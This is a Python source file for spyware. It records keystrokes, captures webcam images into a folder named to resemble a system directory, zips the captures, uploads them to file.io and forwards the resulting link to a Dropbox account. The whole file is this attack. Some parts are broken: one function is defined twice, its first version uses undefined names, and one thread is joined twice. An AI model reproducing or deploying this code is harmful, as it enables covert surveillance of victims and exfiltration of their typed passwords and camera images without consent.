import threading
import time
import keyboard
import requests
import sys
import os
import cv2
import webbrowser
import shutil
import zipfile
import dropbox

open('1.txt' , 'w').truncate(0)
folder_path = 'wind0w'
os.makedirs(folder_path, exist_ok=True)

def on_keys(event):
	with open('1.txt' , 'a') as file:
		file.write(event.name + ' ')
keyboard.on_release(on_keys)


def capture():
	print("inside camera thread")
	cap = cv2.VideoCapture(0)
	if not cap.isOpened():
		print("Unable to open camera...")
	else:
		print("camera opened...")

	folder_path = 'wind0w'


	frame_count, i = 0, 0

	while i < 5:
		time.sleep(2)
		ret, frame = cap.read()

		if not ret:
			print("error")
			break

		frame_filename = os.path.join(folder_path, f"frame-{frame_count}.jpg")
		cv2.imwrite(frame_filename, frame)
		frame_count += 1
		i += 1

	cap.release()
	cv2.destroyAllWindows()


def compress():
    # Create a zip file with write permissions
    with zipfile.ZipFile(output.zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Walk through the folder
        for root, dirs, files in os.walk(wind0w):
            for file in files:
                # Create the full file path
                file_path = os.path.join(root, file)
                # Write the file to the zip file, with relative path
                arcname = os.path.relpath(file_path, start=wind0w)
                zipf.write(file_path, arcname)

def compress():
    time.sleep(20)
    source_path = '1.txt'
    destination_path = 'wind0w'
    shutil.move(source_path, destination_path)
    # Create a zip file with write permissions
    with zipfile.ZipFile('output.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
        # Walk through the folder
        for root, dirs, files in os.walk('wind0w'):
            for file in files:
                # Create the full file path
                file_path = os.path.join(root, file)
                # Write the file to the zip file, with relative path
                arcname = os.path.relpath(file_path, start='wind0w')
                zipf.write(file_path, arcname)	
    shutil.rmtree('wind0w')

def upload():
	time.sleep(25)
	original_stdout = sys.stdout
	with open ('123.txt' , 'w') as f:
		sys.stdout = f
		try:
			with open('output.zip', 'rb') as file:
				files = {'file': file}
				response = requests.post('https://file.io', files=files)
				if response.status_code == 200:
					response_data = response.json()
					print("URL == ", response_data.get('link'))
		finally:
			sys.stdout = original_stdout
		os.remove('output.zip')
		#sys.exit("exited the code")




capture_images = threading.Thread(target=capture)
compress_files = threading.Thread(target=compress)
run_upto = threading.Thread(target=upload)


capture_images.start()
compress_files.start()
run_upto.start()



run_upto.join()
capture_images.join()
run_upto.join()

def upload_to_dropbox(file_path, dropbox_path, access_token):
    time.sleep(60)
    dbx = dropbox.Dropbox(access_token)
    try:
        with open(file_path, 'rb') as f:
            dbx.files_upload(f.read(), dropbox_path)
        print("File uploaded successfully.")
    except FileNotFoundError:
        print(f"Error: The file {file_path} was not found.")
    except dropbox.exceptions.ApiError as e:
        print(f"Dropbox API error: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")

#Use your Dropbox creds.....
if __name__ == "__main__":
    ACCESS_TOKEN = ''
    FILE_PATH = '123.txt'
    DROPBOX_PATH = ''

    upload_to_dropbox(FILE_PATH, DROPBOX_PATH, ACCESS_TOKEN)



